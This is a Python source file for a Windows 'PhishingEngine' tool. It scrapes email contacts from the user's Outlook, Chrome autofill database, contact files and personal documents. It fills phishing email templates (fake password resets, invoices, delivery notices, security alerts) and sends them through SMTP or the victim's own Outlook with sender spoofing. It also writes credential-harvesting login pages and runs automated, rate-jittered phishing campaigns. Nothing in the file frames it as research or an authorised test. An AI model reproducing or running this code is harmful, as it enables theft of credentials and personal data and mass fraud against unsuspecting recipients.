import os, sys, json, smtplib, random, time, hashlib, base64, mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import win32com.client, pythoncom, re, requests
from datetime import datetime, timedelta

class PhishingEngine:
    def __init__(self):
        self.templates_dir = os.path.join(os.environ['TEMP'], 'AetherPhishing')
        os.makedirs(self.templates_dir, exist_ok=True)
        
        # Load email templates
        self.templates = self.load_templates()
        
        # Common phishing patterns
        self.patterns = {
            'urgent': ['urgent', 'immediate', 'action required', 'important'],
            'financial': ['invoice', 'payment', 'bank', 'account', 'payroll'],
            'security': ['password', 'login', 'security', 'verify', 'suspicious'],
            'social': ['friend', 'family', 'emergency', 'help', 'need']
        }
    
    def load_templates(self):
        """Load phishing email templates."""
        templates = {
            'password_reset': {
                'subject': 'Urgent: Password Reset Required',
                'body': '''Dear User,

Our security system has detected suspicious activity on your account. 
To protect your information, we require immediate password reset.

Click here to reset your password: {link}

If you did not request this change, please contact support immediately.

Best regards,
IT Security Team
{company}''',
                'variables': ['link', 'company']
            },
            'invoice': {
                'subject': 'Invoice #{invoice_number} - Payment Required',
                'body': '''Dear {recipient_name},

Please find attached invoice #{invoice_number} for {amount}.

Invoice Details:
- Amount: {amount}
- Due Date: {due_date}
- Description: {description}

Pay online: {payment_link}

If you have any questions, please contact us.

Sincerely,
Accounting Department
{company}''',
                'variables': ['recipient_name', 'invoice_number', 'amount', 'due_date', 'description', 'payment_link', 'company']
            },
            'delivery': {
                'subject': 'Delivery Notification - Package #{tracking_number}',
                'body': '''Hello,

Your package with tracking number {tracking_number} is ready for delivery.

Delivery attempted: {date}
Status: Requires signature confirmation

Please confirm delivery details: {tracking_link}

If you have questions, contact our support.

Thank you,
Delivery Service''',
                'variables': ['tracking_number', 'date', 'tracking_link']
            },
            'security_alert': {
                'subject': 'SECURITY ALERT: Unusual Login Detected',
                'body': '''Security Alert for {service_name}

We detected a login to your {service_name} account from a new device.

Details:
- Time: {time}
- Location: {location}
- Device: {device}

If this was you, you can ignore this alert.
If not, secure your account now: {secure_link}

Sincerely,
{service_name} Security Team''',
                'variables': ['service_name', 'time', 'location', 'device', 'secure_link']
            }
        }
        
        # Save templates to disk
        for name, template in templates.items():
            template_path = os.path.join(self.templates_dir, f"{name}.json")
            with open(template_path, 'w') as f:
                json.dump(template, f, indent=2)
        
        return templates
    
    def harvest_contacts(self):
        """Harvest contacts from email clients and system."""
        contacts = {
            'outlook': self.harvest_outlook_contacts(),
            'system': self.harvest_system_contacts(),
            'browser': self.harvest_browser_contacts(),
            'files': self.harvest_contacts_from_files()
        }
        
        # Combine and deduplicate
        all_contacts = []
        seen_emails = set()
        
        for source, contact_list in contacts.items():
            if contact_list:
                for contact in contact_list:
                    email = contact.get('email', '').lower()
                    if email and email not in seen_emails:
                        seen_emails.add(email)
                        contact['source'] = source
                        all_contacts.append(contact)
        
        return {
            'total': len(all_contacts),
            'contacts': all_contacts[:100],  # Limit to 100
            'by_source': {k: len(v) if v else 0 for k, v in contacts.items()}
        }
    
    def harvest_outlook_contacts(self):
        """Harvest contacts from Microsoft Outlook."""
        contacts = []
        
        try:
            pythoncom.CoInitialize()
            
            outlook = win32com.client.Dispatch("Outlook.Application")
            namespace = outlook.GetNamespace("MAPI")
            contacts_folder = namespace.GetDefaultFolder(10)  # olFolderContacts
            
            for contact_item in contacts_folder.Items:
                try:
                    email = ""
                    
                    # Try to get email address
                    if hasattr(contact_item, 'Email1Address'):
                        email = contact_item.Email1Address
                    
                    if email and '@' in email:
                        contacts.append({
                            'name': getattr(contact_item, 'FullName', ''),
                            'email': email,
                            'company': getattr(contact_item, 'CompanyName', ''),
                            'job_title': getattr(contact_item, 'JobTitle', '')
                        })
                except:
                    continue
            
            pythoncom.CoUninitialize()
            
        except Exception as e:
            pass
        
        return contacts
    
    def harvest_system_contacts(self):
        """Harvest contacts from system files."""
        contacts = []
        
        # Check common locations
        common_paths = [
            os.path.join(os.environ['USERPROFILE'], 'Contacts'),
            os.path.join(os.environ['USERPROFILE'], 'Documents', 'Contacts'),
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Address Book')
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                # Look for .contact files or other contact formats
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.contact') or file.endswith('.vcf'):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                
                                # Extract email addresses
                                emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', content)
                                for email in emails:
                                    contacts.append({
                                        'name': os.path.splitext(file)[0],
                                        'email': email,
                                        'source_file': filepath
                                    })
                            except:
                                pass
        
        return contacts
    
    def harvest_browser_contacts(self):
        """Harvest contacts from browser autofill and saved forms."""
        contacts = []
        
        # Check Chrome autofill
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'],
                                  'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
        
        if os.path.exists(chrome_path):
            try:
                import sqlite3
                conn = sqlite3.connect(chrome_path)
                cursor = conn.cursor()
                
                # Query autofill profiles
                cursor.execute("SELECT name, email FROM autofill_profiles")
                rows = cursor.fetchall()
                
                for name, email in rows:
                    if email and '@' in email:
                        contacts.append({
                            'name': name or '',
                            'email': email
                        })
                
                conn.close()
            except:
                pass
        
        return contacts
    
    def harvest_contacts_from_files(self):
        """Extract email addresses from documents."""
        contacts = []
        
        # Search common document locations
        search_paths = [
            os.path.join(os.environ['USERPROFILE'], 'Documents'),
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Downloads')
        ]
        
        for path in search_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.rtf')):
                            filepath = os.path.join(root, file)
                            try:
                                # Read file content
                                if file.endswith('.txt'):
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                else:
                                    # For binary files, use minimal reading
                                    with open(filepath, 'rb') as f:
                                        # Read first 64KB
                                        content = f.read(65536).decode('utf-8', errors='ignore')
                                
                                # Extract email addresses
                                emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', content)
                                for email in set(emails):  # Deduplicate
                                    contacts.append({
                                        'name': os.path.splitext(file)[0],
                                        'email': email,
                                        'source_file': filepath
                                    })
                            except:
                                pass
        
        return contacts
    
    def send_phishing(self, target_email, template_name='password_reset', **kwargs):
        """Send phishing email."""
        if template_name not in self.templates:
            return {"error": f"Template not found: {template_name}"}
        
        template = self.templates[template_name]
        
        # Fill template variables
        subject = template['subject']
        body = template['body']
        
        for key, value in kwargs.items():
            placeholder = '{' + key + '}'
            subject = subject.replace(placeholder, str(value))
            body = body.replace(placeholder, str(value))
        
        # Fill any remaining placeholders with defaults
        import string
        for placeholder in set(re.findall(r'\{(\w+)\}', subject + body)):
            if placeholder not in kwargs:
                default = self.get_default_value(placeholder)
                subject = subject.replace('{' + placeholder + '}', default)
                body = body.replace('{' + placeholder + '}', default)
        
        # Send email
        result = self.send_email(
            to_email=target_email,
            subject=subject,
            body=body,
            from_email=kwargs.get('from_email', 'noreply@example.com'),
            from_name=kwargs.get('from_name', 'Security Team')
        )
        
        return {
            'template': template_name,
            'target': target_email,
            'subject': subject,
            'sent': result.get('success', False),
            'message': result.get('message', ''),
            'timestamp': datetime.now().isoformat()
        }
    
    def get_default_value(self, placeholder):
        """Get default value for template placeholder."""
        defaults = {
            'link': 'http://example.com/reset',
            'company': 'Example Corporation',
            'invoice_number': str(random.randint(10000, 99999)),
            'amount': f"${random.randint(100, 5000)}.{random.randint(0, 99):02d}",
            'due_date': (datetime.now() + timedelta(days=7)).strftime('%Y-%m-%d'),
            'description': 'Professional Services',
            'payment_link': 'http://example.com/pay',
            'tracking_number': f"TRK{random.randint(1000000000, 9999999999)}",
            'date': datetime.now().strftime('%Y-%m-%d'),
            'tracking_link': 'http://example.com/track',
            'service_name': 'Example Service',
            'time': datetime.now().strftime('%H:%M'),
            'location': f"{random.choice(['New York', 'London', 'Tokyo', 'Sydney'])}",
            'device': random.choice(['Windows PC', 'iPhone', 'Android', 'MacBook']),
            'secure_link': 'http://example.com/secure',
            'recipient_name': 'Valued Customer'
        }
        
        return defaults.get(placeholder, f'[{placeholder}]')
    
    def send_email(self, to_email, subject, body, from_email=None, from_name=None):
        """Send email via available methods."""
        methods = [
            self.send_email_smtp,
            self.send_email_outlook,
            self.send_email_sendmail
        ]
        
        for method in methods:
            try:
                result = method(to_email, subject, body, from_email, from_name)
                if result.get('success', False):
                    return result
            except:
                continue
        
        return {'success': False, 'message': 'All email methods failed'}
    
    def send_email_smtp(self, to_email, subject, body, from_email=None, from_name=None):
        """Send email via SMTP."""
        try:
            # Try to find SMTP settings from system
            smtp_server = self.get_smtp_server()
            
            if not smtp_server:
                return {'success': False, 'message': 'No SMTP server found'}
            
            # Create message
            msg = MIMEMultipart()
            msg['From'] = f'{from_name or "Sender"} <{from_email or "noreply@example.com"}>'
            msg['To'] = to_email
            msg['Subject'] = subject
            
            # Add body
            msg.attach(MIMEText(body, 'plain'))
            
            # Try to send without authentication first
            try:
                server = smtplib.SMTP(smtp_server, 25, timeout=10)
                server.send_message(msg)
                server.quit()
                
                return {'success': True, 'message': f'Email sent via {smtp_server}'}
            except:
                # Try with authentication if saved credentials exist
                pass
            
            return {'success': False, 'message': 'SMTP failed'}
            
        except Exception as e:
            return {'success': False, 'message': f'SMTP error: {e}'}
    
    def get_smtp_server(self):
        """Get SMTP server from system or common providers."""
        # Check common email providers
        common_servers = [
            'smtp.office365.com',  # Office 365
            'smtp.gmail.com',      # Gmail
            'smtp.mail.yahoo.com', # Yahoo
            'smtp-mail.outlook.com', # Outlook
            'mail.example.com'     # Generic
        ]
        
        # Try to extract from Outlook settings
        try:
            pythoncom.CoInitialize()
            outlook = win32com.client.Dispatch("Outlook.Application")
            account = outlook.Session.Accounts[0] if outlook.Session.Accounts.Count > 0 else None
            
            if account:
                # Try to get SMTP server
                smtp_server = account.SmtpAddress.split('@')[1] if '@' in account.SmtpAddress else None
                if smtp_server:
                    pythoncom.CoUninitialize()
                    return f'smtp.{smtp_server}'
            
            pythoncom.CoUninitialize()
        except:
            pass
        
        # Return first common server
        return common_servers[0] if common_servers else None
    
    def send_email_outlook(self, to_email, subject, body, from_email=None, from_name=None):
        """Send email via Outlook COM interface."""
        try:
            pythoncom.CoInitialize()
            
            outlook = win32com.client.Dispatch("Outlook.Application")
            mail = outlook.CreateItem(0)  # 0 = olMailItem
            
            mail.To = to_email
            mail.Subject = subject
            mail.Body = body
            
            if from_email:
                # Try to set sender (may require permissions)
                try:
                    mail.SentOnBehalfOfName = from_email
                except:
                    pass
            
            mail.Send()
            
            pythoncom.CoUninitialize()
            
            return {'success': True, 'message': 'Email sent via Outlook'}
            
        except Exception as e:
            return {'success': False, 'message': f'Outlook error: {e}'}
    
    def send_email_sendmail(self, to_email, subject, body, from_email=None, from_name=None):
        """Send email via sendmail (if available)."""
        # This would use local sendmail on Unix-like systems
        # Not typically available on Windows
        
        return {'success': False, 'message': 'sendmail not available on Windows'}
    
    def create_phishing_page(self, template_name='login', target_url=None):
        """Create phishing page for credential harvesting."""
        templates = {
            'login': '''
<!DOCTYPE html>
<html>
<head>
    <title>Account Login - {service_name}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .login-box { max-width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        input { width: 100%; padding: 8px; margin: 5px 0; }
        button { background: #0078d4; color: white; border: none; padding: 10px; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign in to {service_name}</h2>
        <form action="{submit_url}" method="post">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p style="color: #666; font-size: 12px;">{footer_text}</p>
    </div>
</body>
</html>
            ''',
            'password_reset': '''
<!DOCTYPE html>
<html>
<head>
    <title>Password Reset - {service_name}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .reset-box { max-width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        input { width: 100%; padding: 8px; margin: 5px 0; }
        button { background: #d40000; color: white; border: none; padding: 10px; width: 100%; }
    </style>
</head>
<body>
    <div class="reset-box">
        <h2>Reset Your Password</h2>
        <p>Enter your email to receive reset instructions.</p>
        <form action="{submit_url}" method="post">
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Send Reset Link</button>
        </form>
        <p style="color: #666; font-size: 12px;">{footer_text}</p>
    </div>
</body>
</html>
            '''
        }
        
        if template_name not in templates:
            return {"error": f"Template not found: {template_name}"}
        
        # Generate unique IDs
        page_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        submit_url = target_url or f"/submit/{page_id}"
        
        # Fill template
        html = templates[template_name]
        html = html.replace('{service_name}', 'Secure Portal')
        html = html.replace('{submit_url}', submit_url)
        html = html.replace('{footer_text}', '© 2024 Security Team. All rights reserved.')
        
        # Save to file
        page_path = os.path.join(self.templates_dir, f'phish_{page_id}.html')
        with open(page_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return {
            'page_id': page_id,
            'path': page_path,
            'url': f'file://{page_path}',
            'submit_url': submit_url,
            'template': template_name
        }
    
    def analyze_target(self, email_address):
        """Analyze target for phishing vulnerabilities."""
        analysis = {
            'email': email_address,
            'domain': email_address.split('@')[-1] if '@' in email_address else '',
            'breached': self.check_breach(email_address),
            'social_media': self.find_social_media(email_address),
            'pattern_suggestions': []
        }
        
        # Suggest phishing templates based on email domain
        domain = analysis['domain'].lower()
        
        if any(corp in domain for corp in ['corp', 'company', 'inc', 'llc']):
            analysis['pattern_suggestions'].append('corporate_invoice')
            analysis['pattern_suggestions'].append('password_reset')
        
        if any(fin in domain for fin in ['bank', 'credit', 'finance', 'invest']):
            analysis['pattern_suggestions'].append('security_alert')
            analysis['pattern_suggestions'].append('account_verify')
        
        if any(edu in domain for edu in ['edu', 'university', 'college', 'school']):
            analysis['pattern_suggestions'].append('library_access')
            analysis['pattern_suggestions'].append('student_portal')
        
        # Default suggestions
        if not analysis['pattern_suggestions']:
            analysis['pattern_suggestions'] = ['password_reset', 'delivery', 'security_alert']
        
        return analysis
    
    def check_breach(self, email_address):
        """Check if email appears in known breaches (simulated)."""
        # In reality, this would query haveibeenpwned.com or similar
        # Simulating for now
        return random.choice([True, False])
    
    def find_social_media(self, email_address):
        """Find social media profiles (simulated)."""
        # In reality, this would search social media sites
        return {
            'found': random.choice([True, False]),
            'sites': random.sample(['Twitter', 'LinkedIn', 'Facebook'], random.randint(0, 2))
        }
    
    def automated_campaign(self, target_list, template_name='password_reset', delay=10):
        """Run automated phishing campaign."""
        results = []
        
        for i, target in enumerate(target_list):
            try:
                # Analyze target
                analysis = self.analyze_target(target)
                
                # Choose best template for this target
                if analysis['pattern_suggestions']:
                    template = random.choice(analysis['pattern_suggestions'])
                else:
                    template = template_name
                
                # Send phishing email
                result = self.send_phishing(
                    target_email=target,
                    template_name=template,
                    company=analysis['domain'].split('.')[0].title() if '.' in analysis['domain'] else 'Example',
                    service_name=f"{analysis['domain'].split('.')[0].title()} Service" if '.' in analysis['domain'] else 'Example Service'
                )
                
                results.append(result)
                
                # Delay between emails
                if i < len(target_list) - 1:
                    time.sleep(delay + random.uniform(-2, 2))
                    
            except Exception as e:
                results.append({
                    'target': target,
                    'error': str(e),
                    'success': False
                })
        
        campaign_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        return {
            'campaign_id': campaign_id,
            'total_targets': len(target_list),
            'successful': sum(1 for r in results if r.get('success', False)),
            'failed': sum(1 for r in results if not r.get('success', True)),
            'results': results
        }